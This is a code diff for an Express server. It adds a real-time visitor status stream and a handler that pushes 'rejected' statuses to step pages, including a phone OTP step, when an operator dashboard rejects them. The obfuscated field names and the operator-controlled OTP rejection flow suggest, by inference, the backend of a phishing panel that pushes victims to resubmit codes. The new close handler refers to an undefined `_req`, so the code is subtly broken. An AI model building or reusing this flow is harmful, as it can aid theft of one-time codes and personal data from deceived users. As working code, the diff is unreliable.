@@ -622,6 +622,65 @@ async function startServer() {
     });
   });
 
+  // SSE endpoint for visitor status updates (step2, step3, step5, etc.)
+  // Customer pages listen to this to get real-time status updates
+  app.get("/api/visitor/:id/stream", (req, res) => {
+    const { id } = req.params;
+    console.log("[Visitor SSE] Client connected for visitor:", id);
+    
+    res.setHeader("Content-Type", "text/event-stream");
+    res.setHeader("Cache-Control", "no-cache");
+    res.setHeader("Connection", "keep-alive");
+    res.setHeader("Access-Control-Allow-Origin", "*");
+    res.flushHeaders();
+
+    // Send initial connection message
+    res.write(`event: connected\ndata: ${JSON.stringify({ visitorId: id })}\n\n`);
+
+    // Store connection for this visitor
+    if (!visitorSseClients.has(id)) {
+      visitorSseClients.set(id, new Set());
+    }
+    visitorSseClients.get(id)!.add(res);
+
+    // Keep connection alive with heartbeat
+    const heartbeat = setInterval(() => {
+      try {
+        res.write(`: heartbeat\n\n`);
+      } catch (e) {
+        clearInterval(heartbeat);
+        visitorSseClients.get(id)?.delete(res);
+      }
+    }, 30000);
+
+    // Remove client on disconnect
+    _req.on("close", () => {
+      clearInterval(heartbeat);
+      visitorSseClients.get(id)?.delete(res);
+      console.log("[Visitor SSE] Client disconnected for visitor:", id);
+    });
+  });
+
+  // Function to broadcast status update to visitor
+  function broadcastToVisitor(visitorId: string, field: string, value: any) {
+    const clients = visitorSseClients.get(visitorId);
+    if (!clients) return;
+    
+    const data = { field, status: value, visitorId };
+    const message = `data: ${JSON.stringify(data)}\n\n`;
+    
+    clients.forEach(client => {
+      try {
+        client.write(`event: status_update\n${message}`);
+      } catch (e) {
+        clients.delete(client);
+      }
+    });
+  }
+
+  // Map to store visitor SSE clients
+  const visitorSseClients = new Map<string, Set<any>>();
+
   app.get("/api/dashboard/requests", async (_req, res) => {
     try {
       const entries = await getDashboardEntries();
@@ -1220,6 +1279,17 @@ async function startServer() {
       });
 
       broadcastToDashboard("dashboard:update", dashboardData);
+
+      // Broadcast to visitor page for real-time update
+      if (targetPage === "step2") {
+        broadcastToVisitor(visitorId, "_v5Status", "rejected");
+      } else if (targetPage === "step3") {
+        broadcastToVisitor(visitorId, "_v6Status", "rejected");
+      } else if (targetPage === "step5") {
+        broadcastToVisitor(visitorId, "phoneOtpStatus", "rejected");
+      } else if (targetPage === "check") {
+        broadcastToVisitor(visitorId, "_v1Status", "rejected");
+      }
 
       res.json({ success: true, rejected: true, targetPage });
     } catch (error) {
